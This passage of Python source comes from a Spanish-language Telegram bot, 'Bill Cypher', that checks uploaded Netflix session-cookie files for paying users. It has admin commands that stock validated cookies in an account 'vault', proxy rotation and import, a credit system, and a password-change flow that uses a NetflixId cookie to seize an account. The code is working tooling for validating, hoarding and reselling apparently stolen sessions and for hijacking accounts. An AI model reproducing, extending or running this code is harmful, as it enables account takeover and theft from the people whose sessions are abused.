        new_mode = _toggle_mode(user_id)
        await query.answer(f"Modo cambiado a {'Información completa' if new_mode == 'full' else 'Básico'} ✅")
    except Exception:
        await query.answer("No se pudo cambiar el modo.")

async def setmode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    try:
        _, uid_str, new_mode = query.data.split(":")
        uid = int(uid_str)
        _USER_MODE[uid] = new_mode
        label = "Información completa" if new_mode == "full" else "Básico"
        await query.answer(f"Formato establecido en {label} ✅")
        await _edit_panel_message(query, _settings_text(uid), _settings_markup(uid))
    except Exception:
        await query.answer("Error al configurar el modo.")

async def setdelivery_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    try:
        _, uid_str, new_delivery = query.data.split(":")
        uid = int(uid_str)
        _set_delivery(uid, new_delivery)
        label = "Card-by-Card 💬" if new_delivery == "cards" else "ZIP 📦"
        await query.answer(f"Modo de entrega establecido en {label} ✅")
        await _edit_panel_message(query, _settings_text(uid), _settings_markup(uid))
    except Exception:
        await query.answer("Error al configurar entrega.")

async def closesettings_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    try:
        await query.message.delete()
    except Exception:
        pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user:
        _record_user_id(update.effective_user.id)
    await update.message.reply_text(_help_text(), parse_mode=ParseMode.HTML)

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        _record_user_id(uid)
    await update.message.reply_text(_info_text(uid), parse_mode=ParseMode.HTML)

async def mode_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        _record_user_id(uid)
    current = _get_mode(uid)
    await update.message.reply_text(
        f"⚙️ <b>Modo de salida actual:</b> <b>{'Información completa' if current == 'full' else 'Básico'}</b>\n\n"
        "Elige tu modo preferido:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("📋 Información completa", callback_data=f"setmode:{uid}:full"),
                InlineKeyboardButton("📄 Básico", callback_data=f"setmode:{uid}:basic"),
            ]
        ]),
    )

async def fullinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        _record_user_id(uid)
    _USER_MODE[uid] = "full"
    await update.message.reply_text("✅ Modo de salida establecido en <b>Información completa</b>.", parse_mode=ParseMode.HTML)

async def basic_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        _record_user_id(uid)
    _USER_MODE[uid] = "basic"
    await update.message.reply_text("✅ Modo de salida establecido en <b>Básico</b>.", parse_mode=ParseMode.HTML)

async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        _record_user_id(uid)
    await update.message.reply_text(_settings_text(uid), parse_mode=ParseMode.HTML, reply_markup=_settings_markup(uid))

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
        return

    if not _USERS_FILE.exists():
        await update.message.reply_text("⚠️ No hay usuarios registrados todavía.")
        return

    uids = [u.strip() for u in _USERS_FILE.read_text(encoding="utf-8").splitlines() if u.strip().isdigit()]
    total = len(uids)

    if total == 0:
        await update.message.reply_text("⚠️ No hay usuarios registrados en el archivo.")
        return

    await update.message.reply_text(
        "👥 <b>Base de Datos de Usuarios</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• <b>Total registrados:</b> <code>{total}</code> usuarios únicos\n"
        "━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML,
    )

    with open(_USERS_FILE, "rb") as f:
        await update.message.reply_document(
            document=f,
            filename="users.txt",
            caption=f"📄 Lista con los {total} IDs registrados",
        )

async def setbanner_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
        return

    msg = update.message
    target = msg.reply_to_message if msg.reply_to_message else msg

    file_id = None
    if target.video:
        file_id = target.video.file_id
    elif target.animation:
        file_id = target.animation.file_id
    elif target.photo:
        file_id = target.photo[-1].file_id
    elif target.document and (target.document.mime_type or "").startswith("video/"):
        file_id = target.document.file_id

    if not file_id:
        await update.message.reply_text(
            "🎬 <b>Cómo configurar el video de cabecera:</b>\n\n"
            "1. Envía el video aquí y escribe de pie de foto <code>/setbanner</code>\n"
            "o\n"
            "2. Responde a un video previamente enviado con <code>/setbanner</code>.",
            parse_mode=ParseMode.HTML,
        )
        return

    _BANNER_FILE.write_text(file_id, encoding="utf-8")
    await update.message.reply_text("🎬 <b>¡Video de cabecera configurado con éxito!</b>", parse_mode=ParseMode.HTML)


# ---------------------------------------------------------------------------
# Gestión de Créditos y Sincronización Automática
# ---------------------------------------------------------------------------

async def setcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
        return

    if len(context.args) < 2:
        await update.message.reply_text(
            "⚠️ <b>Uso de gestión de créditos:</b>\n\n"
            "<code>/setcredits &lt;ID_usuario&gt; &lt;cantidad | unlimited | reset&gt;</code>\n\n"
            "<b>Ejemplos:</b>\n"
            "• <code>/setcredits 123456789 20</code> (Otorga 20 créditos Premium)\n"
            "• <code>/setcredits 123456789 unlimited</code> (Créditos ilimitados)\n"
            f"• <code>/setcredits 123456789 reset</code> (Regresa a usuario normal con {DAILY_FREE_CREDITS} diarios)",
            parse_mode=ParseMode.HTML
        )
        return

    target_id = context.args[0].strip()
    amount_str = context.args[1].strip().lower()

    data = _load_credits()
    user_data = data.setdefault(target_id, {})

    if amount_str in ("unlimited", "ilimitado", "inf"):
        user_data["is_premium"] = True
        user_data["credits"] = "unlimited"
        resp = f"⭐ <b>Usuario <code>{target_id}</code> actualizado:</b> Créditos ILIMITADOS asignados."
    elif amount_str in ("reset", "normal", "0"):
        user_data["is_premium"] = False
        user_data["credits"] = 0
        user_data["used_today"] = 0
        resp = f"👤 <b>Usuario <code>{target_id}</code> restablecido:</b> Cuenta Normal ({DAILY_FREE_CREDITS} créditos diarios)."
    elif amount_str.isdigit():
        val = int(amount_str)
        user_data["is_premium"] = True
        user_data["credits"] = val
        resp = f"⭐ <b>Usuario <code>{target_id}</code> actualizado:</b> <code>{val}</code> créditos Premium asignados."
    else:
        await update.message.reply_text("❌ Valor inválido. Usa un número entero, <code>unlimited</code> o <code>reset</code>.")
        return

    data[target_id] = user_data
    _save_credits(data)
    await update.message.reply_text(resp, parse_mode=ParseMode.HTML)
    await _cloud_auto_save(context.application)

async def addvault_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Solo el propietario puede agregar cookies al baúl.</b>", parse_mode=ParseMode.HTML)
        return

    msg = update.message
    target = msg.reply_to_message if msg.reply_to_message else msg

    if target.document:
        doc = target.document
        fname = doc.file_name or "archivo"
        try:
            tg_file = await doc.get_file()
            raw_bytes = await tg_file.download_as_bytearray()
            extracted = extract_all_cookies_from_bytes(bytes(raw_bytes), filename=fname)

            if not extracted:
                await msg.reply_text("⚠️ No se encontraron cookies de Netflix válidas en el archivo.", parse_mode=ParseMode.HTML)
                return

            vault = _load_vault()
            existing_tokens = {extract_core_netflix_id(c) for c in vault if extract_core_netflix_id(c)}
            added = 0

            for c in extracted:
                token = extract_core_netflix_id(c)
                if token and token not in existing_tokens:
                    vault.append(c.strip())
                    existing_tokens.add(token)
                    added += 1
                elif not token and c.strip() not in vault:
                    vault.append(c.strip())
                    added += 1

            _save_vault(vault)
            await msg.reply_text(
                f"✅ <b>¡Cuentas importadas al baúl con éxito!</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"• 📦 <b>Cuentas únicas añadidas:</b> <code>{added}</code>\n"
                f"• 🔒 <b>Duplicados o sin botones descartados:</b> <code>{len(extracted) - added}</code>\n"
                f"• 🗄️ <b>Stock total verificado:</b> <code>{len(vault)}</code>",
                parse_mode=ParseMode.HTML
            )
            await _cloud_auto_save(context.application)
            return
        except Exception as e:
            await msg.reply_text(f"⚠️ Error procesando archivo: {e}")
            return

    text = ""
    if context.args:
        text = " ".join(context.args)
    elif target.text:
        text = target.text
    elif target.caption:
        text = target.caption

    if not text:
        await msg.reply_text(
            "📦 <b>Cómo agregar cookies al baúl:</b>\n\n"
            "1. Envía un archivo <code>.zip</code> generado por el checker con pie de foto <code>/addvault</code>\n"
            "2. O escribe: <code>/addvault &lt;pega tus cookies aquí&gt;</code>\n"
            "3. O responde a un archivo de resultados con <code>/addvault</code>.",
            parse_mode=ParseMode.HTML
        )
        return

    extracted = extract_cookies_from_text_block(text)
    if not extracted:
        await msg.reply_text("⚠️ No se detectaron cookies válidas en el texto.", parse_mode=ParseMode.HTML)
        return

    vault = _load_vault()
    existing_tokens = {extract_core_netflix_id(c) for c in vault if extract_core_netflix_id(c)}
    added = 0

    for c in extracted:
        token = extract_core_netflix_id(c)
        if token and token not in existing_tokens:
            vault.append(c.strip())
            existing_tokens.add(token)
            added += 1
        elif not token and c.strip() not in vault:
            vault.append(c.strip())
            added += 1

    _save_vault(vault)
    await msg.reply_text(
        f"✅ <b>¡Cookies agregadas al baúl con éxito!</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• 📥 <b>Únicas añadidas:</b> <code>{added}</code>\n"
        f"• 📦 <b>Stock total real:</b> <code>{len(vault)}</code>",
        parse_mode=ParseMode.HTML
    )
    await _cloud_auto_save(context.application)

async def clearvault_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
        return
    _save_vault([])
    await update.message.reply_text("🗑 <b>El baúl de cookies ha sido vaciado.</b>", parse_mode=ParseMode.HTML)
    await _cloud_auto_save(context.application)


# ===========================================================================
# 8. SISTEMA DE RESPALDO Y NUBE TELEGRAM (AUTO-SYNC ANTI-WIPE)
# ===========================================================================
async def _cloud_auto_save(app: Application) -> None:
    """Envía un archivo de sincronización al chat del dueño para no perder datos en redeploys."""
    try:
        vault = _load_vault()
        credits_data = _load_credits()
        users_list = []
        if _USERS_FILE.exists():
            users_list = _USERS_FILE.read_text(encoding="utf-8").splitlines()

        payload = {
            "version": "5G-Turbo",
            "date": date.today().isoformat(),
            "vault": vault,
            "credits": credits_data,
            "users": users_list,
        }
        buf = io.BytesIO(json.dumps(payload, ensure_ascii=False).encode("utf-8"))
        buf.name = "database_sync.json"

        await app.bot.send_document(
            chat_id=OWNER_ID,
            document=buf,
            caption="#DATABASE_SYNC_CLOUD 💾 Auto-guardado en la nube de Telegram",
            disable_notification=True,
        )
    except Exception as e:
        logger.debug(f"Cloud auto save error: {e}")

async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
        return

    vault = _load_vault()
    credits_data = _load_credits()
    users_list = _USERS_FILE.read_text(encoding="utf-8").splitlines() if _USERS_FILE.exists() else []

    payload = {
        "version": "5G-Turbo",
        "date": date.today().isoformat(),
        "vault": vault,
        "credits": credits_data,
        "users": users_list,
    }

    buf = io.BytesIO(json.dumps(payload, ensure_ascii=False, indent=2).encode("utf-8"))
    buf.name = f"backup_bill_{date.today().isoformat()}.json"

    await update.message.reply_document(
        document=buf,
        caption=(
            "💾 <b>COPIA DE SEGURIDAD GENERADA</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• 📦 <b>Cuentas en baúl:</b> <code>{len(vault)}</code>\n"
            f"• 👥 <b>Usuarios con saldo:</b> <code>{len(credits_data)}</code>\n\n"
            "<i>💡 Si actualizas en Infrlo, solo responde a este archivo con <code>/restore</code>.</i>"
        ),
        parse_mode=ParseMode.HTML,
    )

async def restore_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
        return

    msg = update.message
    target = msg.reply_to_message if msg.reply_to_message else msg

    if not target.document or not (target.document.file_name or "").endswith(".json"):
        await msg.reply_text(
            "⚠️ <b>Cómo restaurar:</b>\n"
            "Responde a un archivo de copia <code>.json</code> enviado previamente con <code>/restore</code>.",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        tg_file = await target.document.get_file()
        raw_bytes = await tg_file.download_as_bytearray()
        data = json.loads(raw_bytes.decode("utf-8", errors="replace"))

        restored_vault = data.get("vault", [])
        restored_credits = data.get("credits", {})
        restored_users = data.get("users", [])

        if isinstance(restored_vault, list):
            _save_vault(restored_vault)
        if isinstance(restored_credits, dict):
            _save_credits(restored_credits)
        if isinstance(restored_users, list) and restored_users:
            _USERS_FILE.write_text("\n".join(restored_users) + "\n", encoding="utf-8")

        await msg.reply_text(
            "✅ <b>¡RESTAURACIÓN COMPLETADA CON ÉXITO!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• 📦 <b>Cuentas restauradas:</b> <code>{len(restored_vault)}</code>\n"
            f"• 👥 <b>Registros de créditos:</b> <code>{len(restored_credits)}</code>\n\n"
            "<i>Todo ha quedado sincronizado y activo.</i>",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        await msg.reply_text(f"❌ Error al restaurar respaldo: {e}")


# ---------------------------------------------------------------------------
# Difusión / Notificación
# ---------------------------------------------------------------------------

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
        return

    if not context.args:
        await update.message.reply_text("📢 Usa: <code>/broadcast Tu mensaje aquí</code>", parse_mode=ParseMode.HTML)
        return

    broadcast_msg = update.message.text.split(maxsplit=1)[1]
    if not _USERS_FILE.exists():
        await update.message.reply_text("⚠️ No hay usuarios registrados.")
        return

    uids = [u.strip() for u in _USERS_FILE.read_text(encoding="utf-8").splitlines() if u.strip().isdigit()]
    total_users = len(uids)

    if total_users == 0:
        await update.message.reply_text("⚠️ No hay usuarios registrados todavía.")
        return

    status_msg = await update.message.reply_text(f"⏳ Enviando a {total_users} usuario(s)…", parse_mode=ParseMode.HTML)
    sent = 0
    blocked = 0

    formatted_broadcast = (
        "📢 <b>" + to_bold_italic("NOTIFICACION DE BILL CYPHER") + "</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{broadcast_msg}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

    for target_uid in uids:
        try:
            await context.bot.send_message(
                chat_id=int(target_uid),
                text=formatted_broadcast,
                parse_mode=ParseMode.HTML,
            )
            sent += 1
            await asyncio.sleep(0.04)
        except Exception:
            blocked += 1

    await status_msg.edit_text(
        "✅ <b>Difusión finalizada</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• 📤 <b>Enviados con éxito:</b> {sent}\n"
        f"• 🚫 <b>Bloqueados / Fallidos:</b> {blocked}\n"
        "━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML,
    )


# ---------------------------------------------------------------------------
# Cambio de contraseña (Beta)
# ---------------------------------------------------------------------------

def _extract_netflix_id(text: str) -> str:
    raw = text.strip().strip('"').strip("'")
    if raw.startswith("[") or raw.startswith("{"):
        try:
            data = json.loads(raw)
            cookies = data if isinstance(data, list) else [data]
            for c in cookies:
                if isinstance(c, dict) and c.get("name") == "NetflixId":
                    return (c.get("value") or "").strip()
        except Exception:
            pass

    if "NetflixId=" in raw:
        after = raw.split("NetflixId=", 1)[1]
        val = after.split(";")[0].split('"')[0].split("'")[0].split("\n")[0].split("\r")[0].strip()
        if val:
            return val

    if len(raw) >= 20 and "\n" not in raw and " " not in raw:
        return raw
    return ""

async def changepw_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid:
        _record_user_id(uid)
    _CHANGEPW_STATE[uid] = {"step": "netflix_id"}
    await update.message.reply_text(
        "🔐 <b>Cambiar Contraseña</b> <i>[BETA]</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Paso 1 de 3 — Introduce el valor de la cookie <b>NetflixId</b> de la cuenta:\n\n"
        "Envía /cancel en cualquier momento para abortar.",
        parse_mode=ParseMode.HTML,
    )

async def _handle_changepw_input(update: Update, uid: int, text: str) -> None:
    state = _CHANGEPW_STATE.get(uid)
    if not state:
        return

    step = state.get("step")
    if text.strip().lower() in ("/cancel", "cancel"):
        _CHANGEPW_STATE.pop(uid, None)
        await update.message.reply_text("❌ <b>Cambio de contraseña cancelado.</b>", parse_mode=ParseMode.HTML)
        return

    if step == "netflix_id":
        netflix_id = _extract_netflix_id(text)
        if not netflix_id or len(netflix_id) < 20:
            await update.message.reply_text("⚠️ NetflixId inválido. Inténtalo de nuevo o usa /cancel.", parse_mode=ParseMode.HTML)
            return
        state["netflix_id"] = netflix_id
        state["step"]       = "old_pw"
        await update.message.reply_text("✅ NetflixId recibido.\n\nPaso 2 de 3 — Envía la <b>contraseña actual</b>:", parse_mode=ParseMode.HTML)
        return

    if step == "old_pw":
        if len(text.strip()) < 4:
            await update.message.reply_text("⚠️ Contraseña demasiado corta.", parse_mode=ParseMode.HTML)
            return
        state["old_pw"] = text.strip()
        state["step"]   = "new_pw"
        await update.message.reply_text("✅ Contraseña actual guardada.\n\nPaso 3 de 3 — Envía la <b>nueva contraseña</b>:", parse_mode=ParseMode.HTML)
        return

    if step == "new_pw":
        new_pw = text.strip()
        if len(new_pw) < 8:
            await update.message.reply_text("⚠️ La nueva contraseña debe tener al menos 8 caracteres.", parse_mode=ParseMode.HTML)
            return
        state["new_pw"] = new_pw
        state["step"]   = "confirm"
        await update.message.reply_text(
            f"🔒 <b>Confirmar cambio</b>\n\nNueva contraseña: <code>{new_pw}</code>\n\nResponde <b>SÍ</b> para proceder o /cancel.",
            parse_mode=ParseMode.HTML,
        )
        return

    if step == "confirm":
        if text.strip().upper() not in ("SÍ", "SI", "YES"):
            await update.message.reply_text("❌ Envía <b>SÍ</b> para continuar o /cancel.", parse_mode=ParseMode.HTML)
            return

        netflix_id = state.get("netflix_id", "")
        old_pw     = state.get("old_pw", "")
        new_pw     = state.get("new_pw", "")
        _CHANGEPW_STATE.pop(uid, None)

        status_msg = await update.message.reply_text("⏳ Cambiando contraseña en Netflix…", parse_mode=ParseMode.HTML)
        loop = asyncio.get_event_loop()
        try:
            from password_changer import change_netflix_password
            result = await loop.run_in_executor(None, lambda: change_netflix_password(netflix_id, old_pw, new_pw))
        except Exception as exc:
            await status_msg.edit_text(f"⚠️ <b>Error inesperado:</b> <code>{exc}</code>", parse_mode=ParseMode.HTML)
            return

        if result["success"]:
            await status_msg.edit_text(
                f"✅ <b>¡Contraseña cambiada con éxito!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n🔑 Nueva contraseña: <code>{new_pw}</code>",
                parse_mode=ParseMode.HTML,
            )
        else:
            await status_msg.edit_text(f"❌ <b>Error:</b> {result['message']}", parse_mode=ParseMode.HTML)


# ---------------------------------------------------------------------------
# Gestor de proxies y administración
# ---------------------------------------------------------------------------

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if uid in _CHANGEPW_STATE:
        _CHANGEPW_STATE.pop(uid, None)
        await update.message.reply_text("❌ <b>Cambio de contraseña cancelado.</b>", parse_mode=ParseMode.HTML)
        return
    if uid in _PROXY_ADD_STATE:
        _PROXY_ADD_STATE.discard(uid)
        await update.message.reply_text("❌ Añadir proxy cancelado.")
        return
    if uid in _PROXY_SOURCE_STATE:
        _PROXY_SOURCE_STATE.discard(uid)
        await update.message.reply_text("❌ Importación cancelada.")
        return
    await update.message.reply_text("No hay operaciones activas para cancelar.")

def _proxy_panel_text() -> str:
    from proxy_manager import proxy_manager as pm
    status = pm.status_text()
    sources = pm.list_sources()
    total = pm.count
    lines = [
        "🛡️ <b>Gestor de Proxies</b>",
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"Status: {status}",
    ]
    if total:
        lines.append(f"📦 <b>{total}</b> proxies almacenados")
    else:
        lines.append("<i>No hay proxies guardados aún.</i>")
    if sources:
        lines.append("\n<b>Fuentes automáticas:</b>")
        for i, s in enumerate(sources):
            short = s[:50] + "…" if len(s) > 50 else s
            lines.append(f"  <code>{i+1}. {short}</code>")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
    return "\n".join(lines)

def _proxy_panel_markup(pm) -> InlineKeyboardMarkup:
    toggle_label = "🔴 Desactivar" if pm.enabled else "🟢 Activar"
    cpw_label = "🔴 Proxy CambiarPW: OFF" if not pm.changepw_proxy_enabled else "🟢 Proxy CambiarPW: ON"
    rows = [
        [
            InlineKeyboardButton(toggle_label,          callback_data="proxy:toggle"),
            InlineKeyboardButton("➕ Añadir proxy",     callback_data="proxy:add"),
        ],
        [
            InlineKeyboardButton("📥 URL de origen",    callback_data="proxy:importurl"),
            InlineKeyboardButton("🔄 Refrescar ahora",  callback_data="proxy:refreshsources"),
        ],
        [InlineKeyboardButton(cpw_label, callback_data="proxy:togglechangepw")],
    ]
    if pm.count:
        rows.append([
            InlineKeyboardButton("📄 Descargar lista", callback_data="proxy:downloadlist"),
            InlineKeyboardButton("🗑 Limpiar todo",     callback_data="proxy:clear"),
        ])
    rows.append([
        InlineKeyboardButton("🔙 Volver al Panel", callback_data="panel:back"),
        InlineKeyboardButton("🔄 Actualizar", callback_data="proxy:refresh"),
    ])
    return InlineKeyboardMarkup(rows)

async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text("⛔ <b>Solo el propietario.</b>", parse_mode=ParseMode.HTML)
        return
    from proxy_manager import proxy_manager as pm
    await update.message.reply_text(_proxy_panel_text(), parse_mode=ParseMode.HTML, reply_markup=_proxy_panel_markup(pm))

async def proxy_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    uid = query.from_user.id if query.from_user else 0
    if not is_admin(uid):
        await query.answer("⛔ Solo el propietario.", show_alert=True)
        return
    await query.answer()

    from proxy_manager import proxy_manager as pm
    action = query.data

    if action == "proxy:toggle":
        pm.toggle()
    elif action == "proxy:add":
        _PROXY_ADD_STATE.add(uid)
        await query.message.reply_text("📝 Envía la línea de proxy (host:puerto o host:puerto:user:pass):", parse_mode=ParseMode.HTML)
        return
    elif action == "proxy:importurl":
        _PROXY_SOURCE_STATE.add(uid)
        await query.message.reply_text("🌐 Envía la URL pública de proxies:", parse_mode=ParseMode.HTML)
        return
    elif action == "proxy:refreshsources":
        sources = pm.list_sources()
        if not sources:
            await query.answer("No hay fuentes guardadas.", show_alert=True)
            return
        added, skipped, errors = pm.refresh_all_sources()
        await query.message.reply_text(f"✅ Refrescado. Añadidos: {added}, Omitidos: {skipped}", parse_mode=ParseMode.HTML)
    elif action == "proxy:downloadlist":
        proxies = pm.list_proxies()
        if not proxies:
            await query.answer("No hay proxies guardados.", show_alert=True)
            return
        await query.message.reply_document(document=io.BytesIO("\n".join(proxies).encode()), filename="proxies.txt")
        return
    elif action == "proxy:clear":
        pm.clear_proxies()
    elif action == "proxy:togglechangepw":
        new_val = pm.toggle_changepw_proxy()
        await query.answer(f"Proxy cambiar contraseña: {'ON' if new_val else 'OFF'}")

    try:
        await query.message.edit_text(_proxy_panel_text(), parse_mode=ParseMode.HTML, reply_markup=_proxy_panel_markup(pm))
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Procesamiento de documentos y texto entrante
# ---------------------------------------------------------------------------

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    doc: Document = update.message.document
    uid = update.effective_user.id if update.effective_user else None
    if uid:
        _record_user_id(uid)

    caption = (update.message.caption or "").strip()

    if caption.startswith("/setbanner") and is_admin(uid):
        await setbanner_command(update, context)
        return

    if caption.startswith("/addvault") and is_admin(uid):
        await addvault_command(update, context)
        return

    if caption.startswith("/restore") and is_admin(uid):
        await restore_command(update, context)
        return

    if not consume_credit(uid):
        await update.message.reply_text(
            OUT_OF_CREDITS_TEXT,
            parse_mode=ParseMode.HTML,
            reply_markup=out_of_credits_markup()
        )
        return

    if uid in _ACTIVE_USERS:
        refund_credit(uid)
        await update.message.reply_text("⏳ Ya tienes una comprobación activa. Espera a que termine.", parse_mode=ParseMode.HTML)
        return

    if doc.file_size and doc.file_size > 30 * 1024 * 1024:
        refund_credit(uid)
        await update.message.reply_text("⚠️ El archivo supera los 30 MB permitidos.", parse_mode=ParseMode.HTML)
        return

    mime = doc.mime_type or ""
    fname = (doc.file_name or "").lower()
    is_zip = fname.endswith(".zip") or mime in ("application/zip", "application/x-zip-compressed")
    is_cookie = any(fname.endswith(ext) for ext in COOKIE_EXTENSIONS) or mime in COOKIE_MIME_TYPES

    if not is_zip and not is_cookie:
        refund_credit(uid)
        await update.message.reply_text("❌ Formato no compatible. Envía un <code>.txt</code>, <code>.json</code> o <code>.zip</code>.", parse_mode=ParseMode.HTML)
        return

    if uid:
        _ACTIVE_USERS[uid] = time.time()

    status_msg = await update.message.reply_text(
        "⚡ <b>" + to_bold_italic("BILL CYPHER | INICIALIZANDO") + "</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📥 <i>Descargando archivo de cookies...</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML
    )
    suffix = ".zip" if is_zip else (Path(fname).suffix or ".txt")
    tmp_path = None

    for attempt in range(3):
        try:
            tg_file = await doc.get_file()
            with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tmp:
                await tg_file.download_to_drive(tmp.name)
                tmp_path = tmp.name
            break
        except Exception:
            await asyncio.sleep(1)

    if tmp_path is None:
        refund_credit(uid)
        await status_msg.edit_text("⚠️ Error al descargar el archivo.")
        if uid:
            _ACTIVE_USERS.pop(uid, None)
        return

    original_name = doc.file_name or "desconocido"

    try:
        if is_zip:
            await status_msg.edit_text(
                "⚡ <b>" + to_bold_italic("BILL CYPHER | INICIALIZANDO 5G") + "</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "📦 <i>Extrayendo cuentas del archivo ZIP...</i>\n"
                "━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML
            )
            try:
                entries = read_cookie_texts_from_zip(tmp_path)
            except Exception as _e:
                refund_credit(uid)
                await status_msg.edit_text(f"❌ Error al abrir ZIP: {_e}", parse_mode=ParseMode.HTML)
                return
            finally:
                try:
                    os.unlink(tmp_path)
                except Exception:
                    pass

            if not entries:
                refund_credit(uid)
                await status_msg.edit_text("⚠️ No se encontraron archivos de cookies dentro del ZIP.", parse_mode=ParseMode.HTML)
                return

            all_sets: list[tuple[str, str, str]] = []
            for entry_fname, text in entries:
                for block in split_cookies_from_text(text):
                    all_sets.append((entry_fname, block, block))

            await process_cookie_sets(update, status_msg, all_sets)
        else:
            with open(tmp_path, "rb") as f:
                raw_bytes = f.read()
            try:
                os.unlink(tmp_path)
            except Exception:
                pass

            if _is_binary_content(raw_bytes):
                refund_credit(uid)
                await status_msg.edit_text("❌ El archivo parece una imagen o binario, no cookies de texto.", parse_mode=ParseMode.HTML)
                return

            cookie_text = raw_bytes.decode("utf-8", errors="replace")
            ok, err_msg = _validate_cookie_text(cookie_text)
            if not ok:
                refund_credit(uid)
                await status_msg.edit_text(err_msg, parse_mode=ParseMode.HTML)
                return

            await process_cookies(update, status_msg, cookie_text, source=original_name)

    except Exception as e:
        refund_credit(uid)
        logger.exception("Error procesando documento")
        await status_msg.edit_text(f"⚠️ Error al procesar: {e}", parse_mode=ParseMode.HTML)
    finally:
        if uid:
            _ACTIVE_USERS.pop(uid, None)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else None
    if uid:
        stats_tracker.record_user(uid)
        _record_user_id(uid)

    text = update.message.text.strip()
    if not text:
        return

    if uid and uid in _CHANGEPW_STATE:
        await _handle_changepw_input(update, uid, text)
        return

    if uid and uid in _PROXY_ADD_STATE:
        _PROXY_ADD_STATE.discard(uid)
        from proxy_manager import proxy_manager as pm
        ok, res = pm.add_proxy_raw(text.strip())
        await update.message.reply_text(f"✅ {res}" if ok else f"❌ {res}", parse_mode=ParseMode.HTML)
        return

    if uid and uid in _PROXY_SOURCE_STATE:
        _PROXY_SOURCE_STATE.discard(uid)
        from proxy_manager import proxy_manager as pm
        src_ok, src_msg = pm.add_source(text.strip())
        if src_ok:
            added, skipped, err = pm.fetch_from_url(text.strip())
            await update.message.reply_text(f"✅ Importado: {added} proxies.", parse_mode=ParseMode.HTML)
        else:
